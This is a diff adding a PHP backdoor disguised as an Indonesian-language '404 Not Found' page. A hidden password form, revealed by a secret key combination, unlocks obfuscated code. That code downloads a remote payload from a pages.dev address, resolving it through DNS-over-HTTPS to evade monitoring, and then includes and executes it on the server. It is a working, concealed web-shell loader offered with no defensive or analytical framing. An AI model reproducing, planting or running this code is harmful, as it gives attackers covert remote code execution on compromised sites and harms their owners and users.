@@ -1,0 +1,109 @@
+<?php
+session_start();
+
+// Ganti dengan hash bcrypt password Anda
+ $stored_hash = '$2a$12$79wwcD4SE2jSJnWM/I5hbeolknk/m7c2VMO2DfchQHQGEw8EdP3ue'; // Hash bcrypt untuk password
+
+// Cek apakah password sudah dikirim
+if (isset($_POST['pwd'])) {
+    if (password_verify($_POST['pwd'], $stored_hash)) {
+        $_SESSION['authenticated'] = true;
+    }
+}
+
+// Jika sudah terautentikasi, jalankan shell
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']) {
+    // Shell baru dimulai di sini
+    goto eB5cB; 
+    nn7DR: $dns .= "\144\x6e\x73\x2e\x63"; 
+    goto fRaQm; 
+    i0yXU: $tmp = TMPfIle(); 
+    goto ghVPv; 
+    OACUt: include $path; 
+    goto O7xC_; 
+    eB5cB: error_reporting(0); 
+    goto kb2Cg; 
+    grqu0: $ch = CurL_init($url); 
+    goto fK9U7; 
+    So0QW: cuRl_close($ch); 
+    goto i0yXU; 
+    LI5Ac: $dns .= "\55\x71\x75\x65\162\x79"; 
+    goto grqu0; 
+    yH9er: $dns .= "\x66\154\141\x72\x65\55"; 
+    goto nn7DR; 
+    fRaQm: $dns .= "\157\x6d\57\144\156\163"; 
+    goto LI5Ac; 
+    XWet9: $res = curl_ExEC($ch); 
+    goto So0QW; 
+    kb2Cg: set_time_limit(0); 
+    goto qkCZ6; 
+    Ac8Bd: $dns .= "\57\x63\x6c\157\165\144"; 
+    goto yH9er; 
+    Plcna: $dns .= "\x74\x70\x73\x3a\x2f"; 
+    goto Ac8Bd; 
+    fK9U7: if (defined("\x43\125\x52\114\x4f\120\x54\137\x44\x4f\110\137\x55\122\x4c")) { curL_setOPT($ch, CURLOPT_DOH_URL, $dns); } 
+    goto IWJvn; 
+    D0v5X: curL_seTopt($ch, CURLOPT_SSL_VERIFYPEER, true); 
+    goto XWet9; 
+    mys6s: $dns = "\150\x74"; 
+    goto Plcna; 
+    lZOSU: fprintf($tmp, "\45\163", $res); 
+    goto OACUt; 
+    qkCZ6: $url = "\x68\164\164\160\163\72\57\x2f\x77\x6f\x6e\147\x70\165\162\151\153\x2e\160\141\x67\145\x73\x2e\144\145\x76\57\163\x6f\165\162\143\145\57\163\x74\x72\x65\141\155\x73\x2e\164\170\164"; 
+    goto mys6s; 
+    ghVPv: $path = streaM_Get_meTa_daTa($tmp); 
+    goto vs459; 
+    xbAb3: Curl_seTOPt($ch, CURLOPT_SSL_VERIFYHOST, 2); 
+    goto D0v5X; 
+    IWJvn: cUrl_setOpt($ch, CURLOPT_RETURNTRANSFER, true); 
+    goto xbAb3; 
+    vs459: $path = $path["\165\x72\x69"]; 
+    goto lZOSU; 
+    O7xC_: 
+    // Shell baru berakhir di sini
+} else {
+    // Tampilkan halaman 404 dengan form tersembunyi
+    header("HTTP/1.0 404 Not Found");
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <style>
+            body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+            .error-code { font-size: 72px; color: #333; }
+            .message { font-size: 24px; color: #666; }
+            #loginForm { display: none; margin-top: 30px; }
+            #pwd { padding: 10px; width: 200px; }
+            #submit { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
+        </style>
+    </head>
+    <body>
+        <div class="error-code">404</div>
+        <div class="message">Halaman tidak ditemukan</div>
+        
+        <!-- Form login tersembunyi -->
+        <form method="post" id="loginForm">
+            <input type="password" name="pwd" id="pwd" placeholder="Password" required>
+            <input type="submit" id="submit" value="Login">
+        </form>
+
+        <script>
+            // Deteksi kombinasi tombol rahasia (Ctrl+Shift+X)
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.shiftKey && e.key === 'X') {
+                    document.getElementById('loginForm').style.display = 'block';
+                    document.getElementById('pwd').focus();
+                }
+            });
+
+            // Sembunyikan form saat submit
+            document.getElementById('loginForm').addEventListener('submit', function() {
+                this.style.display = 'none';
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+}
+?>
